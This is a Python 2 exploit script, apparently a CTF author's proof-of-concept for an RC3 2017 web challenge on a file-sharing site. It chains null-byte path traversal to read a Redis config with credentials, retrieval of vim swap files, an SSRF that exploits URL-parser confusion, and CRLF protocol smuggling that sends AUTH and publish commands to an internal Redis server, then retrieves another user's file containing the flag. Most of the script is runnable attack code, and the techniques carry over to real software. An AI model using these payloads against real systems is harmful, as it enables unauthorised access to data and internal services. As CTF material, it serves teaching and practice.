#!/usr/bin/env python
import requests, json, re
from hashlib import sha512
import os.path
from ConfigParser import ConfigParser
from time import sleep

output_file = ".poc.json"

real_flag = "RC3-2017{5910752SHWP6177-soft_kitty}"
prod_domain = "megafile.fun"
prod_server = "https://{}/".format(prod_domain)
dev_domain = "abqtt.supersecret.dev-test.megafile.fun"
dev_server = "https://{}/".format(dev_domain)
db_server_pub = "db.megafile.fun"
# db_server_priv = "172.31.38.50" #in my infra
db_server_priv = "192.168.2.11" #in rc3ctf infra
localhost = "127.0.0.1"
session_cookie_name = "PHPSESSID"
target_user_id=2
target_file_id=1

prod_config_file = "../config.ini"
rocketman_file = "message.txt"
function_swp_file = ".functions.php.swp"
report_uri_swp_file = ".report-uri.php.swp"
swagger_file = "swagger.json"

# names and hashes of certain files that need to exist in prod or dev
prod_files = {
	prod_config_file:
		"c8065ec6655b5b79a0ec1736b3d88d49e8ddf3d3bc559d27f6840aaeef6e5fd512d4274014fdd3cee6aa27fda04147b805592840e7343d749fcbad03080aa5af",
	rocketman_file:
		"e5bda951b3df07a199f58034d7db1631c5673254253cb9f71be481c22052d2181283c3ff5d437de86963182a2f28150343f748cd020eb0d368ac78d84488426d"
}

dev_files = {
	function_swp_file:
		"8461a004298b3913a37d4841424f949f156bd5908460be212f61d898bfa5e7bee3a80d20145a38ad07f5ab376b3c7c9827c9df34ab03e94121d8d7eef0876d94",
	report_uri_swp_file:
		"4a65ca937c901c6f3c052c35cd1d40b2073b492ef5c56a41f649bc0b78d300aad02ab585cbc063bbbb4b69c1967076c2a0819b919cc909986e67db921a303bd9",
	#first one is just the file hash. second one is the HTTP response hash
	swagger_file:
		# "55a57a3198daf83c63a22b1e40c8e6c390b749e50460112f10e225caa6f8cb18e4278945d7284ef502ad7fcc8ce4da1ba4fc3ab69507d2b0c47e654fe147ebc4"
		"901e7e18a5ec5ef7ddabafb6cbdc59d6fd799ce7fae5bf53656ef4f0dbc0adaf5a2c0a55407b53c2b2bead56637585ecbcbe73a7fb7ed16b2b5e01d302922980"
}


def get_cookie(server):
	r = requests.get(server)
	if r.status_code == 200:
		return r.cookies[session_cookie_name]
	else:
		return None


def create_user(server, session):
	'''
	Make request to web app to create a user; return creds and php session ID
	'''
	creds = {
		"user": "iamthebestuser-test",
		"password": "i like passwords, they are the bestest!123"
	}

	data = {
		"username": creds['user'],
		"firstname": "testy",
		"lastname": "mctestface",
		"password": creds['password'],
		"repassword": creds['password']
	}
	endpoint = "register.php"
	r = requests.post(server + endpoint, cookies=session, data=data, allow_redirects=False)
	if r.status_code == 302 and r.headers['Location'] == "/":
		return creds

	code.interact(local=locals())
	return None


def check_logged_in(server, session):
	'''
	Given a session, see if we're logged in already or not
	'''
	endpoint = "share.php"
	r = requests.get(server + endpoint, cookies=session, allow_redirects=False)
	if r.status_code == 200:
		return True
	# this is what we send when visiting a page that requires auth
	elif r.status_code == 302 and r.headers['Location'] == "/login.php":
		return False

	print "not sure... if we're logged in so going with no"
	return False


def login_user(server, creds, session):
	'''
	Make a login request to the server and return the php session ID
	'''
	php_session = ""
	data = {
		"username": creds['user'],
		"password": creds['password']
	}

	endpoint = "login.php"
	r = requests.post(server + endpoint, data=data, cookies=session, allow_redirects=False)
	if r.status_code == 302 and r.headers['Location'] == "/":
		return True

	return None


def get_user_id(server, session):
	r = requests.get(server, cookies=session)
	if r.status_code == 200:
		user_id_pattern = "^\s+<option\s+selected=\"selected\"\s+value=\"(?P<id>\d+)\">"
		m = re.search(user_id_pattern, r.text, re.MULTILINE)
		if m:
			user_id = m.group("id")
			return user_id
		else:
			return "could not find the user ID with the regex"
	else:
		return "Got a non-200 status code"


def get_config_file(filename, session, creds):
	payload = "cgi-bin/get_xml.cgi?name={}%00{}.xml".format(filename, creds['user'])
	error = ""
	r = requests.get(prod_server + payload, cookies=session)

	if r.status_code == 200:
		cur_hash = sha512(r.text).hexdigest()
		if cur_hash == prod_files[filename]:
			# write config to a file
			config_temp = ".config.tmp"
			with open(config_temp, "w") as config:
				config.write(r.text)

			config = ConfigParser()
			config.read(config_temp)
			redis = {}

			#translate to nice dict
			for item in config.items("redis"):
				redis[item[0]] = item[1].strip('"')

			#return the redis config
			return redis
		else:
			error = "hash of {} does not match {}".format(cur_hash, prod_files[filename])
			print "response:", r.text
	else:
		error = "didn't receive a 200 from request, received a {} with text: \n{}".format(r.status_code, r.text)

	return error


def get_php_swp_files(server, session):
	error = None
	domain = None

	#get functions.php swp file
	r = requests.get(server + function_swp_file, cookies=session)
	if r.status_code == 200:
		cur_hash = sha512(r.content).hexdigest()
		if cur_hash != dev_files[function_swp_file]:
			error = "hash doesn't match for functions.php swp file"
	else:
		error = "getting functions.php swp file didn't return 200"

	temp_error = ""
	#get report-uri.php swp file
	r = requests.get(server + report_uri_swp_file, cookies=session)
	if r.status_code == 200:
		cur_hash = sha512(r.content).hexdigest()
		if cur_hash != dev_files[report_uri_swp_file]:
			temp_error = "hash doesn't match for report-uri.php swp file"
	else:
		error = "getting report-uri.php swp file didn't return 200"

	#if we had an error for the first one, combine it with the error for the second one
	if error:
		error = error + "\n" + temp_error
	else:
		error = temp_error

	#lolz this is a binary file bc vim swp, so just return the domain without finding it
	#get the domain we need to pretend to be for the first SSRF
	# domain_pattern = "^\$approved_host\s+=\s+\"(?P<domain>[a-z0-9\-\.]+)\";$"
	# m = re.search(domain_pattern, r.text, re.MULTILINE)
	# if m:
	# 	domain = m.group("domain")
	# else:
	# 	temp_error = "regex couldn't find domain"
	# 	if error:
	# 		error = error + "\n" + temp_error
	# 	else:
	# 		error = temp_error
	domain = "41da029b1352f8733d17f23def226ec4.report-uri.com"

	return {
		"domain": domain,
		"error": error
	}


def first_ssrf(server, filename, domain):
	#https://abqtt.supersecret.dev-test.megafile.fun/report-uri.php?url=http://foo@127.0.0.1:8080 @41da029b1352f8733d17f23def226ec4.report-uri.com/
	#https://abqtt.supersecret.dev-test.megafile.fun/report-uri.php?url=http%3A%2F%2Ffoo%40127.0.0.1%3A8080%20%4041da029b1352f8733d17f23def226ec4.report-uri.com%2F
	error = ""
	ssrf = "http://foo@127.0.0.1:8080 @{}/{}".format(domain, filename)
	endpoint = "/report-uri.php?url=" + ssrf
	r = requests.get(server + endpoint)
	if r.status_code == 200:
		#remove leading text
		# trimmed_contents = r.text.find("{")
		cur_hash = sha512(r.text).hexdigest()
		if cur_hash == dev_files[filename]:
			return True
		else:
			return "hash for {} response doesn't match".format(filename)


def add_redis_share(server, redis, domain, user_id, target_id):
	#report-uri.php?url=http%3A%2F%2Ffoo%40127.0.0.1%3A8080%20%4041da029b1352f8733d17f23def226ec4.report-uri.com%2Fconfigs%2F
	flask_api_endpoint = "configs/"
	get_param_ssrf = "http://foo@127.0.0.1:8080 @{}/{}".format(domain, flask_api_endpoint)
	endpoint = "report-uri.php?url=" + get_param_ssrf

	#http%3A%2F%2F172.31.38.50%0D%0A%20AUTH%20f2ca143fc4fd33f6dfcec811e4d19f3cb017a8b904535195037b970e401d0ce2fa40320b9169bafb38f08c5db216803a2f267f0f243b17c65bd48fae92dc3609%0D%0A%20publish%20shares%20%222%203%22%0D%0A%20%3A6379
	post_ssrf = "http://{0}\r\n AUTH {1}\r\n publish shares \"{2} {3}\"\r\n :{4}".format(
		db_server_priv,
		redis['password'],
		target_id,
		user_id,
		redis['port']
	)

	data = {
		"url": post_ssrf
	}

	r = requests.post(server + endpoint, data=data)
	if r.status_code == 200:
		return True
	else:
		return "Got a non-200 status code"


def get_regular_file(server, session, target_file_id, filename):
	flag = ""
	error = ""

	data = {
		"downfileid": target_file_id
	}
	r = requests.post(server, cookies=session, data=data)
	if r.status_code == 200:
		cur_hash = sha512(r.text).hexdigest()
		if cur_hash == prod_files[filename]:
			flag_pattern = "flag:\s+(?P<flag>RC3\-2017\{[a-zA-Z0-9\-_]+\})"
			m = re.search(flag_pattern, r.text)
			if m:
				flag = m.group("flag")
			else:
				error = "regex couldn't find flag"
		else:
			error = "hash didn't match for {}".format(filename)
	else:
		error = "Got a non-200 status code"

	return {
		"flag": flag,
		"error": error
	}


def main():
	creds = ""
	prod_session = requests.cookies.RequestsCookieJar()
	dev_session = requests.cookies.RequestsCookieJar()

	#if output file exists, we already created the user so don't create the user again, just login
	if os.path.isfile(output_file):
		with open(output_file, "r") as f:
			creds = json.load(f)

		# if our stored session cookie is no good anymore, login to prod
		if not check_logged_in(prod_server, {session_cookie_name: creds['prod_cookie']}):
			#php is dumb (or maybe i am) so we have to make a request to get a session ID first
			prod_cookie = get_cookie(prod_server)
			if prod_cookie:
				creds['prod_cookie'] = prod_cookie
				prod_session.set(session_cookie_name, prod_cookie, domain=prod_domain)
			else:
				print "problem getting PHPSESSID"
				return -1

			#login to prod
			result = login_user(prod_server, creds, prod_session)
			if not result:
				print "problem logging into prod"
				return -1

			#our prod_cookie has changed, so rewrite creds to output file
			with open(output_file, "w") as f:
				json.dump(creds, f)
		else: #add prod cookie to our jar
			prod_session.set(session_cookie_name, creds['prod_cookie'], domain=prod_domain)

		# if our stored session cookie is no good anymore, login to dev
		if not check_logged_in(dev_server, {session_cookie_name: creds['dev_cookie']}):
			#php is dumb (or maybe i am) so we have to make a request to get a session ID first
			dev_cookie = get_cookie(dev_server)
			if dev_cookie:
				creds['dev_cookie'] = dev_cookie
				dev_session.set(session_cookie_name, dev_cookie, domain=dev_domain)
			else:
				print "problem getting PHPSESSID"
				return -1

			#login to dev
			result = login_user(dev_server, creds, dev_session)
			if not result:
				print "problem logging into dev"
				return -1

			#our dev_cookie has changed, so rewrite creds to output file
			with open(output_file, "w") as f:
				json.dump(creds, f)
		else: #add prod cookie to our jar
			dev_session.set(session_cookie_name, creds['dev_cookie'], domain=dev_domain)

		print "logged in successfully!"
	#user doesn't exist yet, so we have to create one
	else:
		#php is dumb (or maybe i am) so we have to make a request to get a session ID
		prod_cookie = get_cookie(prod_server)
		dev_cookie = get_cookie(dev_server)

		#add cookies to our cookie jar
		if prod_cookie and dev_cookie:
			prod_session.set(session_cookie_name, prod_cookie, domain=prod_domain)
			dev_session.set(session_cookie_name, dev_cookie, domain=dev_domain)
		else:
			print "problem getting PHPSESSID"
			return -1

		creds = create_user(prod_server, prod_session)
		creds2 = create_user(dev_server, dev_session)

		# if cookies are non null, add them to our cookie jar and write creds to file
		if creds and creds2:
			creds['prod_cookie'] = prod_cookie
			creds['dev_cookie'] = dev_cookie
			with open(output_file, "w") as f:
				json.dump(creds, f)

			print "user created, creds written to " + output_file
		else:
			if not creds:
				print "problem creating user in prod"
			elif not creds2:
				print "problem creating user in dev"

			return -1

	#get our user ID on the prod app
	user_id = get_user_id(prod_server, prod_session)

	if isinstance(user_id, str):
		print "problem getting our user ID in prod"
		return -1

	print

	# comment this out because each time this is run, we want to verify the whole chain of events works
	# print "attempting to get the target file, in case we've already done the exploiting..."
	# result = get_regular_file(prod_server, prod_session, target_file_id, rocketman_file)
	# if result['flag']:
	# 	print "[+] we got the file! flag: {}".format(result['flag'])
	# 	# return 0
	# else:
	# 	print "couldn't get the file, we'll exploit things then try again later"

	# print

	# get redis parameters from config.ini
	redis = get_config_file(prod_config_file, prod_session, creds)

	if isinstance(redis, str):
		print "[1] {}".format(redis)
		return -2
	else:
		print "[1] got config file successfully (redis creds)"

	print

	# get php swap files
	swp_result = get_php_swp_files(dev_server, dev_session)

	if swp_result['error']:
		print "[3] {}".format(swp_result['error'])
		return -3
	elif swp_result['domain']:
		print "[3] we got the swp files and the domain we need to spoof: {}".format(swp_result['domain'])
	else:
		print "[3] no errors, but couldn't parse out the domain name"
		return -3

	print

	# get swagger.json via SSRF
	print "attempting the first SSRF to hit the internal flask API..."
	result = first_ssrf(dev_server, swagger_file, swp_result['domain'])

	if isinstance(result, str):
		print "[4] {}".format(result)
		return -4
	else:
		print "[4] first SSRF succeeded. we got swagger.json"

	print

	# add share to redis via double SSRF + protocol smuggling
	print "attempting the second SSRF to add the share..."
	print "this will probably take at least 30 seconds to return anything"
	result = add_redis_share(dev_server, redis, swp_result['domain'], user_id, target_user_id)

	if isinstance(result, str):
		print "[5] {}".format(result)
	else:
		print "[5] seems like adding the redis share worked. now for the moment of truth..."

	# try to get message.txt from prod app 10 times in case the share replication takes a while
	print "attempting to get the target file up to 10 times"
	for i in xrange(1, 11):
		result = get_regular_file(prod_server, prod_session, target_file_id, rocketman_file)

		if result['flag']:
			print "[+] we got the file! flag: {}".format(result['flag'])
			break
		elif result['error']:
			print result['error']
		else:
			print "sad panda. no file :("

		print "trying to retrieve file again..."
		sleep(i)

if __name__ == '__main__':
	exit(main())
